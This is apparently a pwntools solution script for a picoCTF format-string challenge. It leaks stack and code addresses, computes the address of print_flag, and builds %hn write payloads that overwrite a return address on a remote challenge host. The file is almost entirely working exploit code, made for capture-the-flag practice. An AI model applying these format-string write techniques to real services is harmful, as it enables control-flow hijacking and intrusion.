from pwn import *

#context.log_level = "error"
#context.log_level = "warn"
context.log_level = "info"
#context.log_level = "debug"

context.arch='amd64'



def breakline():
    print("\n" + "=" * 80 + "\n")


def openGDB(p):
    # set context for tmux
    context.terminal = ['tmux', 'splitw', '-h']

    gdb.attach(p, gdbscript="""
    # some gdb commands
    b *echo_valley+249
    b print_flag
    c
    """)


def findFmtOffset():
    def exec_fmt(payload):
        p = process('./valley')
        p.sendline(payload)
        p.sendline(b"exit")
        res = p.recvall()
        p.close()
        return res  # waits end of process /!\

    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    breakline()

    return offset



############################################### Payload Generation ###############################################

"""
offsetCorrector : basically count the amount of characters before the target address in payload, and divide by 8
                  should be 2 most of the time
                  
                  example :
                  %33385c%8$hnAAAAh\xb4\x10\x05\xff\x7f\x00\x00
                  ^^^^^^^^^^^^^^^^
                  16 char so offsetCorrector = 2
                  Note : 'h' is part of the address, just encoded
"""
def manualPayloadByte(offset, offsetCorrector, dest, value):
    """ Génération manuelle d'un payload pour écrire un entier de 1 octet"""
    
    payload = f"%{value}c%{offset+offsetCorrector}$hhn".encode()

    # Ajout de l'adresse sur la stack (Little Endian)
    payload += b'A' * (8 - (len(payload) % 8))  # Padding pour alignement
    payload += p64(dest)

    log.info(f"Payload: {payload}")
    return payload


def manualPayloadShort(offset, offsetCorrector, dest, value):
    """ Génération manuelle d'un payload pour écrire un entier de 2 octets"""
    
    payload = f"%{value}c%{offset+offsetCorrector}$hn".encode()

    # Ajout de l'adresse sur la stack (Little Endian)
    payload += b'A' * (8 - (len(payload) % 8))  # Padding pour alignement
    payload += p64(dest)

    log.info(f"Payload: {payload}")
    return payload


def manualPayloadInt(offset, offsetCorrector, dest, value):
    """ Génération manuelle d'un payload pour écrire un entier de 4 octets"""
    
    payload = f"%{value}c%{offset+offsetCorrector}$n".encode()

    # Ajout de l'adresse sur la stack (Little Endian)
    payload += b'A' * (8 - (len(payload) % 8))  # Padding pour alignement
    payload += p64(dest)

    log.info(f"Payload: {payload}")
    return payload


def makePayload(offset, dest, value, size='byte'):
    """ Auto payload gen but looks broken, byte option uses lln """
    payload = fmtstr_payload(offset, {dest: value}, write_size=size)
    log.info(f"Payload: {payload}")
    return payload

##################################################################################################################


def getLeakedAddr(p):
    p.sendline(b'%20$p:%21$p')
    p.recvline()
    leak = p.recvline().split(b" ")[5].split(b':')
    #log.info(f"Leaked addresses: {leak[0]} : {leak[1]}")
    return int(leak[0], 16), int(leak[1], 16)


def main():
    #p = process('./valley')
    p = remote('shape-facility.picoctf.net', 53432)
    offset = findFmtOffset()
    #openGDB(p)


    # ========== User Code ==========

    destOffset = 8   # diff between addr leaked and des addr
                     # this is between the stack address and the leaked (not the value on the stack)
                     # leaked - offset = des addr
                     # leaked = %20$p
                    
    valOffset = 426  # diff between leak of 'return addr of echo_valley to main' and the address of print_flag
                     # leaked - offset = print_flag
                     # leaked = %21$p

    leakedDest, leakedVal = getLeakedAddr(p)
    log.info(f"Leaked Destination: {hex(leakedDest)}")
    log.info(f"Leaked Value: {hex(leakedVal)}")

    # ===============================

    finalDest = leakedDest - destOffset
    finalVal = (leakedVal-valOffset) & 0xFFFF

    log.info(f"Final Destination: {hex(finalDest)}")
    log.info(f"Final Value: {hex(finalVal)}")

    p.sendline(manualPayloadShort(offset, 2, leakedDest-destOffset, finalVal))  # write 2 bytes is enough
    p.interactive()














if __name__ == "__main__":
    main()